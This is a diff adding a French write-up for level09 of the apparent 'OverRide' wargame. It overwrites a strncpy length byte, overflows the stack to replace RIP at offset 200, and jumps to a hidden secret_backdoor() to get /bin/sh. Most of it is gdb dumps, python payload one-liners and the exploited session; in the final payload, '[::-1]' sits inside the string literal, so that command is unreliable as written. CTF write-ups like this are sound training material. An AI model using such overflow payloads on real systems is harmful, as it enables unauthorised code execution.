@@ -1,5 +1,100 @@
 ### Level09
 
+Ce programme en 64bit nous donne le prompt une fois pour renseigner notre nom d'utilisateur ainsi qu'une seconde fois pour un message.
+Il existe une fonction secret_backdoor() jamais appelle dans le code, qui permet de faire un appel system avec comme argument une string recupere dans fgets().
+Apres plusieurs test de buffer overflow sur les deux prompts qui sont des fgets(), aucun resultats concrets.
+
+On decide alors de s'atarder sur les strncpy dans les deux fonctions appellees dans handle_msg() :
+
+- Dans set_username() :
+
+	strncpy(username + 0x8c, input, 41);
+
+- Dans set_msg() :
+
+	strncpy(username, buffer, username + 0xb4);
+
+Le but est de modifier la taille de copie du second strncpy qui utilise la valeur a l'adresse 'username + 0xb4' soit l'adresse 0x7fffffffe5b4.
+Le premier strncpy va nous permettre d'ecraser la valeur contenu a cette adresse 0x7fffffffe5b4.
+Cette adresse contient de base la valeur 0x8c soit 140 en decimal.
+Voici la stack avec un username "AAAA" :
+
+	0x7fffffffe580:	0xf7dd4260	0x00007fff	0xf7a9608f	0x41414141 <======= Debut du tableau username
+	0x7fffffffe590:	0x0000000a	0x00000000	0x00000000	0x00000000
+	0x7fffffffe5a0:	0x00000000	0x00000000	0x00000000	0x00000000
+	0x7fffffffe5b0:	0x00000000	0x0000008c  <========= Adresse 0x7fffffffe5b4 
+
+Avec un pattern de 41 caracteres dans input, le strncpy permettera de remplacer la valeur 0x8c dans la stack par le 41eme caractere du pattern :
+
+	python -c 'print "A" * 40 + "\xFF"'
+
+On met la valeur maximum possible pour un octet soit 255.
+La stack avec notre pattern "A" * 40 + "\xFF" :
+
+	0x7fffffffe570:	0xffffe6b0	0x00007fff	0xf7a95d45	0x00007fff
+	0x7fffffffe580:	0xf7dd4260	0x00007fff	0xf7a9608f	0x41414141
+	0x7fffffffe590:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x7fffffffe5a0:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x7fffffffe5b0:	0x41414141	0x000000ff	<========= Ecrasement de la valeur 0x8c
+
+Le second strncpy peut maintenant copier 255 caracteres dans username.
+A partir de la, on peut verifier le pattern necessaire afin d'ecraser le registre RIP.
+
+On prend un pattern de 300 caracteres :
+
+	(gdb) r < <(python -c 'print "A" * 40 + "\xFF" + "\n" + "A0B0C0D0E0F0G0H0I0J0K0L0M0N0O0P0Q0R0S0T0U0V0W0X0Y0Z0A1B1C1D1E1F1G1H1I1J1K1L1M1N1O1P1Q1R1S1T1U1V1W1X1Y1Z1A2B2C2D2E2F2G2H2I2J2K2L2M2N2O2P2Q2R2S2T2U2V2W2X2Y2Z2A3B3C3D3E3F3G3H3I3J3K3L3M3N3O3P3Q3R3S3T3U3V3W3X3Y3Z3A4B4C4D4E4F4G4H4I4J4K4L4M4N4O4P4Q4R4S4T4U4V4W4X4Y4Z4A5B5C5D5E5F5G5H5I5J5K5L5M5N5O5P5Q5R5S5T5"')
+	
+
+Offset pattern generator :
+
+	200
+
+On sait maintenant que le registre RIP est ecrase a partir de 200.
+On recupere ensuite l'adresse de la fonction secret_backdoor :
+
+	(gdb) p secret_backdoor
+	$4 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
+
+Notre injection final ressemblera a ca :
+
+	(python -c 'print "A" * 40 + "\xFF" + "\n" + "A" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c[::-1]"'; cat -) | ./level09
+
+Le programme nous retourne le prompt, on peut maintenant indiquer l'execution de /bin/sh par la fonction system dans la backdoor secrete :
+
+	level09@OverRide:~$ (python -c 'print "A" * 40 + "\xFF" + "\n" + "A" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c[::-1]"'; cat -) | ./level09
+	--------------------------------------------
+	|   ~Welcome to l33t-m$n ~    v1337        |
+	--------------------------------------------
+	>: Enter your username
+	>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+	>>: >: Msg sent!
+	"/bin/sh"                          
+	cd ../end
+	cat end
+	GG !
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 Premier prompt : 44 "A"
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> ecrasement de la case memoire 0x0000008c qui est la taille n donne pour le deuxieme strncpy
@@ -9,6 +104,8 @@ Deuxieme prompt :
 
 gdb ./level09
 
-0x55555555488c
+Adresse secret_backdoor : 0x55555555488c
 
 r < <(python -c 'print "A" * 40 + "\xFF" + "\n" + "A" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c[::-1]"')
+
+(python -c 'print "A" * 40 + "\xFF" + "\n" + "A" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c[::-1]"'; cat -) | ./level09
